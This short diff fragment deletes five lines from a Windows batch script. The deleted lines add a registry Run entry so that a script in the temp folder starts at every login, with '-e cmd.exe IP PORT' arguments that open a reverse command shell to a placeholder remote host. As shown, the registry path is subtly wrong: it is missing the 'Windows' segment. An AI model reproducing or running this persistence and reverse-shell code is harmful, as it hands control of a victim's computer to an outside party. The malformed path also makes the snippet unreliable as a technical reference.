@@ -1,5 +1,0 @@
-::===============================================================
-::  add to autorun
-::===============================================================
-set program_name=YOURSCRIPTFILE.CMD
-reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "%TMP%\%program_name% -e cmd.exe IP PORT" /f
